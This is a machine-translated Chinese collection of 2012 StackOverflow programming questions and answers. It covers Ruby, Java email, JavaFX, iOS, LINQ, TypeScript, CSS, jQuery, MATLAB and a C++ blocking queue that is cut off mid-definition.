# StackOverflow 问答 13353000-13353999

# ruby - Ruby 哈希插值

> ID：13353002
> 
> 赞同：2
> 
> 时间：2012-11-12T22:58:09.967
> 
> 标签：ruby, enumerable

我有一个混合类型的哈希：

```
stuff = {:pack_one => ["blue_item", "red_item"], :pack_two => [:green_item, :purple_item, :yellow_item]} 
```

我需要把它转换成一个句子，比如：

```
"pack_one contains a blue_item and red_item and pack_two contains a green_item, purple_item and yellow_item" 
```

所以我假设我需要使用 Enumerable 并遍历哈希并构建句子，但我不确定如何？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T23:05:06.550

我的解决方案。适合要求比@Eureka 答案更严格一些。

```
strings = stuff.map do |key, values|
  "#{key} contains a #{values[0..-2] * ', '} and #{values.last}"
end
puts strings.join ' and ' 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T23:28:21.517

***如果***您可以使用[ActiveSupport](http://api.rubyonrails.org/classes/Array.html#method-i-to_sentence)，这是一个作弊：

```
require 'active_support/core_ext/array/conversions'
stuff.map{|k,v| "#{k} contains a #{v.to_sentence}"}.join(" and ") 
```

结果：

```
1.9.3p125 > require 'active_support/core_ext/array/conversions'
 => true 
1.9.3p125 > stuff.map{|k,v| "#{k} contains a #{v.to_sentence}"}.join(" and ")
 => "pack_one contains a blue_item and red_item and pack_two contains a green_item, purple_item, and yellow_item" 
```

**编辑**：要摆脱牛津逗号，明确提供`last_word_connector`选项：

```
1.9.3p125 > stuff.map{|k,v| "#{k} contains a #{v.to_sentence(last_word_connector: " and ")}"}.join(" and ")
 => "pack_one contains a blue_item and red_item and pack_two contains a green_item, purple_item and yellow_item" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:01:52.857

这是一个解决方案，使用`Enumerable#map`and `Array#join`：

```
stuff.map do |k, v|
  "#{k} contains a #{v.size > 2 ? v[0..-2].join(", ") + " and " + v[-1].to_s : v.join(' and ')}"
end.join(" and ")
=> "pack_one contains a blue_item and red_item and pack_two contains green_item and purple_item and yellow_item" 
```

编辑：现在完全符合您的要求。

# java - 以编程方式代表 Google 群组发送电子邮件

> ID：13353010
> 
> 赞同：3
> 
> 时间：2012-11-12T22:58:59.470
> 
> 标签：java, email, send, google-groups

我想知道是否可以，如果可以，如何代表 Google 群组发送电子邮件。

我正在使用 Google Apps，我目前有一个用户 no-reply@... 用于发送电子邮件（例如密码剩余）。但是我不喜欢这是系统中的实际用户，因为我觉得它应该只是一个组。

我现在使用的代码可以在下面看到

```
private final String mailPassword = "somepass";
private final String mailUserName = "no-reply@";

public MailService() {
    initializeSession();
}

public void sendMailWithPassword(String email, String content) {

    Message message = new MimeMessage(session);
    message.setFrom(new InternetAddress(mailUserName));
    message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(email));

    message.setSubject("Password Reminder");
    message.setText(content);

    Transport.send(message);
}

private void initializeSession() {
    Properties props = new Properties();

    props.put("mail.smtp.host", "smtp.gmail.com");
    props.put("mail.smtp.socketFactory.port", "465");
    props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
    props.put("mail.smtp.auth", "true");
    props.put("mail.smtp.port", "465");

    session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {

        @Override
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(mailUserName, mailPassword);
        }
    });
} 
```

但是，如果我更改`mailUsername`为组名，则会出现以下异常

> 421 4.7.0 临时系统问题。稍后再试（HS）。k2sm18720682eep.15

# combobox - javafx-2，仅在输入键上设置的可编辑组合框值

> ID：13353011
> 
> 赞同：3
> 
> 时间：2012-11-12T22:59:04.897
> 
> 标签：combobox, javafx-2

我有一个 javafx 可编辑的组合框。
value 属性仅在我按 enter 时更新，而不仅仅是退出 ComboBox。
在我看来，这似乎是一个错误而不是设计功能，因为如果一个非聚焦控件显示一个未由其 value 属性反映的值，那就太奇怪了。

这是一个显示问题的 SSCE：

```
import javafx.application.Application;
import javafx.beans.*;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

public class T02 extends Application {

public static void main (String [] args) { launch(args); }

@Override public void start(Stage stage) throws Exception {

    System.out.println("javafx.runtime.version: " + System.getProperties().get("javafx.runtime.version"));

    VBox vbox = new VBox();

    //this combobox is the object of the investigation
    final ComboBox comboBox = new ComboBox();
    comboBox.setEditable(true);
    vbox.getChildren().add(comboBox);

    //I need another component just to allow the ComboBox to loose the focus
    TextField textField = new TextField();
    vbox.getChildren().add(textField);

    //And here it is: when comboBox looses focus, i print its state
    comboBox.focusedProperty().addListener(new InvalidationListener() {
        @Override public void invalidated(Observable observable) {
            //return if it has the focus: i am just interested on focus lost
            if (comboBox.focusedProperty().get()) {return;}
            System.out.println(comboBox.getValue());
        }
    } );

    stage.setScene(new Scene(vbox));
    stage.show();
}

} 
```

输出：
[在combo上写点东西，然后点击另一个控件（或者按tab，都是一样的）]
null
[点击返回combo，按回车然后在文本字段上点击]
hello

第一个null很奇怪，可能是bug正如我之前所说。我对 jira 进行了快速搜索，但没有发现这种行为。（可能我没注意）

**更新**
好的，我刚刚添加了

```
System.out.println("javafx.runtime.version: " + System.getProperties().get("javafx.runtime.version")); 
```

并得到结果：

```
javafx.runtime.version: 2.1.something 
```

我已经升级了最后一个可用的版本：

```
javafx.runtime.version: 2.2.3-b05 
```

问题消失了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T03:00:39.283

[RT-21454 ComboBox 值](http://javafx-jira.kenai.com/browse/RT-21454)中修复的相关错误应在焦点离开时更新。

**更新**

AgostinoX 报告说，通过升级到`JavaFX 2.2.3-b05`.

您可以通过将以下代码放在 JavaFX 应用程序的 start 方法中来检查您正在使用的 javafx 版本。

```
System.out.println("javafx.runtime.version: " + System.getProperties().get("javafx.runtime.version")); 
```

# ios - 调用 PerformSelector-iOS 的最佳方式

> ID：13353014
> 
> 赞同：0
> 
> 时间：2012-11-12T22:59:51.293
> 
> 标签：ios, ios6, performselector

我正在调用使用不同时间戳调用 URL 的方法。但是，数据处理可能需要比我定义的时间更长的时间。

```
 [self performSelector:@selector(process) withObject:nil afterDelay:1.6]; 
```

下面的部分显示了该方法被调用

```
 -(void)process
{
    timestamp=[NSString stringWithFormat:@"%1.f",progressValue];
    NSString *contour=@"&bandschema=4";
    NSString *url6=[NSString stringWithFormat:@"http://contour.php?  callback=contourData%@&type=json&timestamp=%@%@",timestamp,timestamp,contour];        
    NSURL *url1=[NSURL URLWithString:url6];
  __weak ASIHTTPRequest *request1 = [ASIHTTPRequest requestWithURL:url1];
        [request1 setCompletionBlock:^{
            responseString = [request1 responseString];
                [self plotPoint:self.responseString];

        }];
        [request1 setFailedBlock:^{

            NSError *error=[request1 error];
            NSLog(@"Error: %@", error.localizedDescription);
        }];
        [request1 startAsynchronous];
    } 
```

这部分是分析数据的起点。

```
-(void)plotPoint:(NSString *)request
{
    NSArray *polygonArray = [[dict  objectForKey:@"data"]valueForKey:@"polygon"];
    NSArray *valleyPolygonArray = [[dict objectForKey:@"valley"]valueForKey:@"polygon"];
    CLLocationCoordinate2D *coords;
} 
```

然而，有时时间间隔不足以获取新数据，尤其是当互联网连接不好时。

你能指导我吗？我该如何处理这个问题？最佳解决方案是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:03:41.030

你能提供一些代码吗？基本上你需要在请求完成的委托调用中执行操作

更多信息：http: [//developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html](http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html)

[http://developer.apple.com/library/mac/#documentation/Foundation/Reference/NSURLConnectionDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intf/NSURLConnectionDelegate](http://developer.apple.com/library/mac/#documentation/Foundation/Reference/NSURLConnectionDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intf/NSURLConnectionDelegate)

编辑：
我还是不太明白，但看看这是否对你有帮助：

```
__weak ASIHTTPRequest *request1 = [ASIHTTPRequest requestWithURL:url1];  
        [request1 setCompletionBlock:^{  
            responseString = [request1 responseString];  
                [self plotPoint:self.responseString];  

        //if (something)  
            [self process];  
        }]; 
```

# plugins - 对于 YUI，是否有 Chosen.js 的替代品？

> ID：13353020
> 
> 赞同：1
> 
> 时间：2012-11-12T23:00:27.367
> 
> 标签：plugins, yui, selection

我被要求美化应用程序的 UI，即用更漂亮/更可定制的东西替换它呈现选择元素的默认方式。我们正在为库使用 YUI，我似乎找不到任何具有类似于 jQuery 的 Common.js 功能的插件。有自动完成，但它需要输入，我们需要保留选择元素的行为，同时替换它的外观。有没有人知道任何 YUI 插件可以做到这一点，或者我必须从头开始构建一个？

谢谢！卢卡

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:38:51.797

没有什么比 Chosen.js 更漂亮了。图库中有几个用于选择元素的增强器：http: [//yuilibrary.com/gallery/show/itsaselectlist](http://yuilibrary.com/gallery/show/itsaselectlist)，它使选择元素更像按钮，以及[http://yuilibrary.com/gallery/show/multiselect](http://yuilibrary.com/gallery/show/multiselect)，它将一个多选框变成一个稍微漂亮的复选框列表。

如果您确实在 YUI 中创建了 Chosen.js 克隆，请考虑将其提交到图库，这将是一个很好的补充！

# ios - 为什么 UIBarButtonItem 没有观察到 HIG？

> ID：13353022
> 
> 赞同：0
> 
> 时间：2012-11-12T23:00:39.993
> 
> 标签：ios, cocoa-touch, uibarbuttonitem

根据人机界面指南，触摸目标不应小于 44x44 点。但是`UIBarButtonItem`，导航等许多常见动作所依赖的 a ，只有大约 20x20 点。

这有什么原因（除了这些是“准则”之外）？如果我在我认为合适的地方使用类似大小的按钮，我的应用会被拒绝吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:04:52.137

UIBarButtonItem 的触摸区域比图标的大小要大得多。所以它不违反HIG。

如果您有一个触摸区域小于 44x44 的按钮，则您的应用不太可能被拒绝，但用户使用起来会更加困难。我用过很多触摸区域很小的应用程序。能做大就做大，做不到就做大。

# asp.net-mvc - Jquery Json 响应适用于除 Ipad 以外的所有设备

> ID：13353028
> 
> 赞同：1
> 
> 时间：2012-11-12T23:00:57.767
> 
> 标签：asp.net-mvc, json, ipad, jquery

在用户输入地址并单击按钮后，我将返回以获取商店列表。这适用于除 Ipad 之外的所有浏览器。在这种情况下，它返回一个成功状态，但返回一个空数据对象。下面是我的脚本和服务器响应代码。我搜索了所有我能想到的东西，但没有发现类似的问题。任何帮助，将不胜感激。

---Javascript---------

```
$.post("/storefinder/GetStores",
{
lng: lng,
lat: lat
},
function (data, status) {
var storeLoc = data.split(' -- ')
setupStores(storeLoc);
}); 
```

---MVC控制器代码---

```
[HttpPost]
public ActionResult GetStores(string lng, string lat)
{
double dLng = double.MaxValue;
double dLat = double.MaxValue;
double.TryParse(lng, out dLng);
double.TryParse(lat, out dLat);
StringBuilder rtrnString = new StringBuilder();           

List<Hls.Mapping.Retailer> AllRetailers = Infrastructure.Cache.HeelysCacheItems.RetailerList(false);
List<Hls.Mapping.Retailer> ClosestRetailers = Hls.Mapping.MapRequest.ClosestRetailers(dLat, dLng, 20, AllRetailers);

foreach (Hls.Mapping.Retailer r in ClosestRetailers)
{
    rtrnString.Append(r.DisplayName);
    rtrnString.Append(" -- ");
    rtrnString.Append(r.Address1);
    rtrnString.Append(" -- ");
    rtrnString.Append(r.City + ", " + r.State + " " + r.ZipCode);
    rtrnString.Append(" -- ");
    rtrnString.Append(r.Phone);
    rtrnString.Append(" -- ");
    rtrnString.Append("Distance: " + Math.Round(r.distance, 2).ToString() + " miles");
    rtrnString.Append(" -- ");
    rtrnString.Append(r.Latitude.ToString());
    rtrnString.Append(" -- ");
    rtrnString.Append(r.Longitude.ToString());
    rtrnString.Append(" -- ");
}

return Json(rtrnString.ToString());
} 
```

# c# - linq to sql "into" 有条件的 select

> ID：13353032
> 
> 赞同：2
> 
> 时间：2012-11-12T23:01:15.627
> 
> 标签：c#, sql, linq

我有一个 Invoice 类，我希望有多个包，但我只希望这些包在它们的发货晚于记录中的最后一条记录时才存在。我一直在使用“into”来让其他组进入对象，但我正在努力只加入特定的包。

```
from invoice in invoices
join item in InvoiceItems on invoice.InvoiceId equals item.InvoiceId into items // Gives the item collection
join package in packages on invoice.InvoiceId equals package.InvoiceId // only want the packages that satisfy the condition...
where package.ShipDate > (subquery) 
```

这个查询可以工作，除非如果有多个包裹，我会得到多张相同的发票。如果我在加入的末尾添加“到包中”，我不知道如何只获取满足第二个条件的包。

子查询是：

```
(from lastSentRecord in records
where lastSentRecord.InvoiceID == invoice.InvoiceID
orderby lastSentRecord.SendDateTime descending
select lastSentRecord.SendDateTime ?? new DateTime()).First() 
```

类结构的重要部分是

```
Invoice --- InvoiceID
Package --- InvoiceID, ShipDate
Record --- InvoiceID, SendDateTime, EmailType 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T09:28:20.170

您可以将它们更改为两个单独的查询，然后满足第二个条件（可能首先调用第二个条件，以便您可以为 where 创建变量）。下面的文章向您展示了如何通过在 select 语句中执行此操作来做到这一点。

[这也可以解决您的问题](http://odetocode.com/blogs/scott/archive/2007/09/24/nested-selects-in-linq-to-sql.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T19:45:22.503

作为一种解决方法，我做了以下事情：

```
from invoice in invoices
join packge in packages on invoice.InvoiceId equals package.InvoiceId into packages
where (from package in packages
       where package.InvoiceId == invoice.InvoiceId
       where package.ShipDate > timeSent
       select 1).Any()
select new {packages.Where(p => p.ShipDate > timeSent)} 
```

它完成了工作，但我想以更好的方式完成它。我将把这个打开一段时间，看看是否有人有答案，然后我会接受这个作为答案。

# typescript - 打字稿编译器错误：“无法获取属性'publicMembers'的值：对象为空或未定义”

> ID：13353033
> 
> 赞同：0
> 
> 时间：2012-11-12T23:01:20.470
> 
> 标签：typescript, tsc

我发现了一个场景，我可以可靠地让 TypeScript 编译器失败并显示错误消息：“内部错误：无法获取属性‘publicMembers’的值：对象为空或未定义”

这是我的 Repro.ts 文件：

```
interface Callback { (data: any): void; }

class EventSource1 {
    addEventHandler(callback: Callback): void { }
}

class EventSource2 {
    onSomeEvent: Callback;
}

export class Controller {
    constructor () {
        var eventSource = new EventSource1();
        // Commenting the next line will allow it to compile.
        eventSource.addEventHandler(msg => this.handleEventFromSource1(msg));
    }
    private handleEventFromSource1(signalState) {
        console.log('Handle event from source 1');
        var eventSource2 = new EventSource2();
        // Commenting the next line will allow it to compile.
        eventSource2.onSomeEvent = msg => this.handleEventFromSource2(msg);
    }
    private handleEventFromSource2(event) {
        console.log("Handling event from source 2.");
    }
} 
```

这很可能是[TypeScript 编译器崩溃的副本： publicMembers 为 null 或 undefined](https://stackoverflow.com/questions/12966623/typescript-compiler-crash-publicmembers-is-null-or-undefined)，但重现明显不那么复杂，所以我想我还是会继续发布它。

有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T23:58:48.007

我已将此添加到[Codeplex 上的错误中](http://typescript.codeplex.com/workitem/286)。

如果您还没有证明它对您来说也是一个问题，那么您应该投票支持该错误。

你是对的，没有什么可以添加到答案中的——这是编译器中的一个错误。我们只需要等待修复。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T07:22:08.160

另一种解决方法。声明`void`方法的返回类型：

```
private handleEventFromSource1(signalState): void { ... }
private handleEventFromSource2(event): void { ... } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T01:18:31.547

对于它的价值，到目前为止我发现的问题的最佳解决方法（直到他们修复编译器错误）是避免命名的回调接口。换句话说，这段代码工作得很好：

```
class EventSource1 {
    addEventHandler(callback: { (data: any): void; }): void { }
}

class EventSource2 {
    onSomeEvent: { (data: any): void; };
}

class Controller {
    constructor () {
        var eventSource = new EventSource1();
        eventSource.addEventHandler(msg => this.handleEventFromSource1(msg));
    }
    private handleEventFromSource1(signalState) {
        console.log('Handle event from source 1');
        var eventSource2 = new EventSource2();
        eventSource2.onSomeEvent = msg => this.handleEventFromSource2(msg);
    }
    private handleEventFromSource2(event) {
        console.log("Handling event from source 2.");
    }
} 
```

# html - 占据父母的所有高度

> ID：13353035
> 
> 赞同：0
> 
> 时间：2012-11-12T23:01:24.147
> 
> 标签：html, css

我有两个并排的`<div>`块，它们都包含在一个更大的`<div>`块中。我希望两个子`<div>`块中较小的一个占据父块的所有剩余垂直空间，而实际上不知道父块的高度。

这可以在没有任何 Javascript 的情况下完成吗？

在这个例子中：http: [//jsfiddle.net/5J8Em/2/](http://jsfiddle.net/5J8Em/2/)我希望红色`<div>`和蓝色一样高。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T23:09:15.957

尝试使用`display:table;`父元素和子元素`display: table-cell;`：

**HTML：**

```
<div id="a">
    <div id="b">
        hello world 
    </div>
    <div id="c">
        hello world hello world hello world 
        hello world hello world hello world 
    </div>
</div>​ 
```

**CSS：**

```
#a {
     background-color:rgb(100,100,100);      
     width:200px; 
     display:table;
}

#b {
     background-color:red; 
     vertical-align:top;
     display: table-cell;
}

#c {
     background-color:blue;   
     width:100px;
     word-wrap:break-word;   
     display: table-cell;    
} 
```

这是**[jsFidde](http://jsfiddle.net/qolami/5J8Em/13/)演示**

# jquery - 在通过 javascript 填充的表单选择上使用 jQuery-chosen

> ID：13353036
> 
> 赞同：2
> 
> 时间：2012-11-12T23:01:28.870
> 
> 标签：jquery, jquery-chosen

**我正在尝试将 jquery-chosen [jquery-chosen](http://harvesthq.github.com/chosen/)集成到我的应用程序中。**

我有**两个选择控件**：当用户从第一个中选择一个选项时，**第二个根据从第一个中选择的值（经典级联选择）动态更新**（通过 jQuery）。

我希望在第二个选择控件中使用 jquery-chosen。

**这是我的js**：

```
$(document).ready(function() {
    $(".chzn-select").chosen();
});

$(document).ready(function() {
    var geolocationRegionSelect = $("#geolocationRegionSelect");//first select control
    geolocationRegionSelect.bind('change', function(event) {
        $.get("/kadjoukor/geolocations/findDepartmentsByRegion?regionId="+$(this).val(), function(result){
            console.log(result);        
            var geolocationDepartmentSelect = $("#geolocationDepartmentSelect");//second select control
            geolocationDepartmentSelect.empty();
            $.each(result, function() {
                geolocationDepartmentSelect.append($("<option />").val(this.id).text(this.department));
            });
        }, 'json');
        $("#geolocationDepartmentSelect").trigger("liszt:updated");
    });
}); 
```

**这是第二个控件的 html**：

```
 <div class="controls">
        <select id="geolocationDepartmentSelect"  data-placeholder="Choose a department" multiple="multiple" class="chzn-select chzn-done"></select>
    </div> 
```

**我注意到在静态填充的选择上使用 jquery-chosen 效果很好**。只有使用我的动态填充选择（第二个），我才能让 jquery-chosen 工作。

我尝试使用 jq-chosen 页面中记录的触发功能：

> **动态更新选择**
> 
> 如果您需要更新您的选择字段中的选项并希望 Chosen 获取更改，您需要在该字段上触发“liszt:updated”事件。选择将根据更新的内容重新构建自己。

不幸的是，它对我不起作用...

**编辑：**我还必须提到，在加载页面时，所选控件仅呈现为纯 html 多选。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:42:21.953

我将选择控件更改为：

```
<select id="geolocationDepartmentSelect"  data-placeholder="Choose a department" multiple="multiple" class="chzn-select"></select> 
```

和js：

```
$(".chzn-select").chosen({no_results_text: "No results matched"}); 
```

和

```
$(".chzn-select").trigger("liszt:updated"); 
```

问题消失了。

# java - gwt mvp 联系人示例项目在 eclipse 中导入时出错

> ID：13353039
> 
> 赞同：1
> 
> 时间：2012-11-12T23:02:09.613
> 
> 标签：java, eclipse, gwt

我从 GWT MVP Contacts 项目下载了示例

[谷歌 gwt mvp 教程](https://developers.google.com/web-toolkit/articles/mvp-architecture)

并将其导入到 eclipse juno 中。当eclipse加载它时，我收到以下错误： ![在此处输入图像描述](../Images/9ae1b3bb5c2e72b93b4ab4bc91085e12.png)

当我尝试运行这个项目时，控制台给了我这个错误信息：

> 加载模块 com.myproject.example.places.Contacts [错误] 无法在您的类路径上找到“com/myproject/example/places/Contacts.gwt.xml”；可能是拼写错误，或者您忘记包含源的类路径条目？[错误] shell 在 doStartup 方法中失败

在我下载这个示例项目之前，我创建了我自己的项目，我也称之为“联系人”，但是我从工作区中删除了它，然后我下载了 gwt mvp 联系人示例并将其导入到 eclipse 中。

这是什么样的错误以及如何消除它？

请帮忙。

iam 使用 eclipse juno 和 gwt 2.5 版本

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-20T09:11:41.827

在您的构建文件中，在目标“gwtc”下，您可能会看到以下内容

这应该更改为适当的值。转到您的 src 文件夹，在该文件夹下您可能会发现 xxxx.gwt.xml 文件包含在类似 com.google.gwt.sample.logexample 的包中。说在这个包里面你找到文件 LogExample.gwt.xml

您正确的 arg 值应该是

希望这可以帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T14:50:10.183

如果您使用的是 Eclipse 或类似的 IDE，请右键单击项目 => 属性 => Java 构建路径，在 Order 和 Export 下确保检查所有条目，错误应该会消失

请参考下图：

![在此处输入图像描述](../Images/ca4a3b0191a13698cf59e54dcf46a715.png)

# matlab - 并行工具箱与常规matlab错误处理的区别

> ID：13353040
> 
> 赞同：1
> 
> 时间：2012-11-12T23:02:12.480
> 
> 标签：matlab

在最近的一篇文章中，有人告诉我并行工具箱处理警告的方式与常规 matlab 处理警告的方式之间存在差异。我觉得海报的手在某种程度上回答了我的问题，所以我将其标记为已回答。但我还有一些额外的问题（希望这不构成重复发布）。

[错误仅在我不使用 parfor 时触发？](https://stackoverflow.com/questions/13349145/error-only-triggers-when-i-dont-use-parfor)

我只是想知道是否有人可以向我解释这些差异是什么？另外，parfor 被沙盒化是什么意思？

是否仍然可以使用带有并行工具箱的 try catch 类型结构或使用其他机制来链接相同的东西？

要清楚，当我使用 parfor 运行时，仍然会产生警告消息，告诉我 matix 状况不佳，但尽管我添加了这些行，但它似乎并没有被视为错误

```
warnState(1) = warning('error', 'MATLAB:singularMatrix'); 
warnState(2) = warning('error', 'MATLAB:illConditionedMatrix'); 
```

但是，当我使用常规 for 循环运行时，它会被视为错误。

因此，并行工具箱正确地产生了警告，只是没有通过上面的代码将它们转换为错误，因此它们可以在 try catch 结构中使用。

亲切的问候

休

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T19:08:13.410

我认为您原始代码中的问题是您仅在 MATLAB 客户端上将警告更改为错误。要对工人进行这种改变，你需要做

```
spmd
    warnState(1) = warning('error', 'MATLAB:singularMatrix'); 
    warnState(2) = warning('error', 'MATLAB:illConditionedMatrix'); 
end 
```

还有[pctRunOnAll](http://www.mathworks.com/help/distcomp/pctrunonall.html)函数可以在任何地方运行。

另外，我不知道 OP 对 matlabpool 工作人员被“沙盒化”意味着什么。您的 MATLAB 客户端和工作程序之间的区别是：

1.  工作人员始终以单线程模式运行；和
2.  工人在没有显示的情况下运行（尽管他们可以生成屏幕外图形并保存到文件）

# css - Zurb Foundation 模板调整大小问题

> ID：13353041
> 
> 赞同：1
> 
> 时间：2012-11-12T23:02:17.133
> 
> 标签：css, resize, responsive-design, zurb-foundation

我正在使用 Zurb Foundation 模板（博客）构建个人网站，但我遇到了调整大小的问题。基本上，我想让它响应，但我想我在此过程中搞砸了。我将页脚放在一个更大的容器中，并且在调整大小时它没有放在应有的位置。

如果有人可以帮助我保持下去，我将不胜感激。

这里是：

[http://arbal.netii.net/](http://arbal.netii.net/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T17:06:40.547

所有的`height:100%`价值观似乎都是问题所在。您可能需要在媒体查询中覆盖它们，以便在移动设备上将它们重置为默认值。

# jquery - 按住鼠标按钮时仅 IE 的鼠标事件问题

> ID：13353042
> 
> 赞同：0
> 
> 时间：2012-11-12T23:02:20.123
> 
> 标签：jquery, internet-explorer-9

以下 jQuery 代码用于在各种表单文本框 ( `input type='text' title='tooltip text'`) 元素上显示工具提示。除了在一种特定情况下，它仅在 IE (7-9) 中有效。

```
function toolTip() {
    var xOffset = 10;
    var yOffset = 20;

    $(".tooltip")
        .each(function () {
            this.tooltipText = this.title;
            $(this).removeAttr("title");
        })
        .mouseenter(function (e) {
            $("body").append("<p id='tooltip'>" + this.tooltipText + "</p>");
            $("#tooltip")
                .css("top", (e.pageY - xOffset) + "px")
                .css("left", (e.pageX + yOffset) + "px")
                .fadeIn("fast");
        })
        .mouseleave(function () {
            $("#tooltip").remove();
        })
        .mousemove(function (e) {
            $("#tooltip")
                .css("top", (e.pageY - xOffset) + "px")
                .css("left", (e.pageX + yOffset) + "px");
        });
} 
```

该场景如下：

*   文本框中的鼠标按下
*   将鼠标移出文本框*工具提示继续显示*
*   释放鼠标按钮*后，释放鼠标按钮工具提示保持可见*

该问题是由当鼠标移到其他元素上时触发的各种鼠标事件引起的，*除了*`mouseleave`释放鼠标按钮时的最终事件。[请参阅http://jsfiddle.net/richev/VXUS9/8/](http://jsfiddle.net/richev/VXUS9/8/)上的工作演示。对这里发生的事情有任何想法吗？

## 更新

此问题也存在于 IE 中[Bassistance jQuery tooltip](http://jquery.bassistance.de/tooltip/demo/)上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T10:35:33.033

这是您找出鼠标事件时的临时解决方案。基本上它在执行 mouseenter 代码之前检查目标是否实际上是输入：

[http://jsfiddle.net/LCefq/1/](http://jsfiddle.net/LCefq/1/)

```
function toolTip() {
    var xOffset = 10;
    var yOffset = 20;

    var tooltipElems = $(".tooltip");

    tooltipElems.each(function() {
        this.tooltipText = this.title;
        $(this).removeAttr("title");
    });

    tooltipElems.mouseenter(function(e) {
        if ($(e.target).is('.tooltip')) {
            $("body").append("<p id='tooltip'>" + this.tooltipText + "</p>");
            $("#tooltip").css("top", (e.pageY - xOffset) + "px").css("left", (e.pageX + yOffset) + "px").fadeIn("fast");
            $('#state').append("<div>mouseenter" + $(e.target)[0].tagName +"</div>");
        }
    }).mouseleave(function() {
        $("#tooltip").remove();
        $('#state').append("<div>mouseleave</div>");
    });

    $(".tooltip").mousemove(function(e) {
        $("#tooltip").css("top", (e.pageY - xOffset) + "px").css("left", (e.pageX + yOffset) + "px");
    });
}

$(document).ready(function() {
    toolTip();
}); 
```

我的以下[测试](http://jsfiddle.net/LCefq/2/)（IE8）的结果看起来像这样，尽管显然你得到了不同的结果。

![在此处输入图像描述](../Images/057df818799203e21434857dfeb87702.png)

# java - 能够使用 Java 或其他软件语言与 LTSpice 虚拟电路进行交互

> ID：13353044
> 
> 赞同：2
> 
> 时间：2012-11-12T23:02:39.273
> 
> 标签：java

我正在与一些 EE 合作一个项目，他们正在设计一个具有一些可编程逻辑的电路。他们正在 LTSpice 中对该电路进行建模。一旦它实际上是一个合适的电路，我将设计一个 GUI 作为该电路的控制界面。我想知道是否有某种方法可以让我使用 Java 或其他编程语言与 LTspice 电路“对话”，这样我就可以在设计我的 GUI 和控制后端时抢占先机。

# c# - 具有重复行的 Linq 选择结果

> ID：13353045
> 
> 赞同：1
> 
> 时间：2012-11-12T23:02:45.480
> 
> 标签：c#, linq

我的选择从 db 返回连接数据，其中每个对象都有几个属性。对于对象的每个属性，我都有一个新行。我使用实体框架来检索数据。

```
var products = _ctx.ExecuteFunction<GetProducts_Result>("GetProducts"); 
```

GetProducts 是一个存储过程，它返回以下结果。

```
Code    | Name | Term | Rate
--------+------+------+-----
111     | Foo  | 12   | 10
111     | Foo  | 24   | 12  
111     | Foo  | 36   | 16
222     | Boo  | 12   | 8
222     | Boo  | 24   | 9 
```

我如何有效地使用 linq 查询数据并映射到类似的类

```
class Product
{
     int    Code
     string Name
     List<Term> terms;
} 
```

其中 Term 是一个带参数的类 (Term, Rate)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T23:06:58.117

```
var products = from p in _ctx.ExecuteFunction<GetProducts_Result>("GetProducts")
               group p by new {p.Code, p.Name} into g
               select new Product
               {
                   Code = g.Key.Code,
                   Name = g.Key.Name,
                   terms = g.Select(x => new Terms { 
                                            Term = x.Term, 
                                            Rate = x.Rate }).ToList()
               }; 
```

# css - 使文本从底部开始

> ID：13353049
> 
> 赞同：1
> 
> 时间：2012-11-12T23:02:56.977
> 
> 标签：css

我将尝试简化我的问题以使其更易于理解。

我希望能够在页面底部的文档中添加文本行（使用 javascript）。
当新行被推入时，它被添加到底部，将所有先前的行向上推。

文档应该被填充，当内容溢出时，旧的行（顶部的）应该被隐藏或使用滚动，在这种情况下它应该滚动到底部。

我已经尝试了一段时间，但我没有任何优雅的解决方案。
有任何想法吗？CSS3 非常受欢迎。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:07:58.193

默认情况下有一个 HTML 元素执行此操作，它是 UL 只需将其包含在一个固定高度的 div 中并溢出，并且将重点放在最后一个 LI 上！

# c++ - 具有自定义阻塞队列实现的未解析外部符号

> ID：13353051
> 
> 赞同：0
> 
> 时间：2012-11-12T23:03:08.600
> 
> 标签：c++, qt, linker-errors, blockingqueue

我创建了自己的阻塞队列，但在弄清楚为什么会出现链接器错误时遇到了一些麻烦（注意这是 Visual Studio 2010 中的 Qt 应用程序）：

```
#ifndef BLOCKING_QUEUE_H
#define BLOCKING_QUEUE_H

#include <QObject>
#include <QSharedPointer>
#include <QWaitCondition>
#include <QMutex>
#include <queue>

namespace TestingNS
{
    template<typename Data>
    class BlockingQueue
    {
    private:
        std::queue<QSharedPointer<Data>> _queue;
        QMutex _mutex;
        QWaitCondition _monitor;
        volatile bool _closed;

    public:
        BlockingQueue();

        void Close();

        size_t Size();

        void Empty();

        bool IsClosed();

        bool Enqueue(QSharedPointer<Data> data);

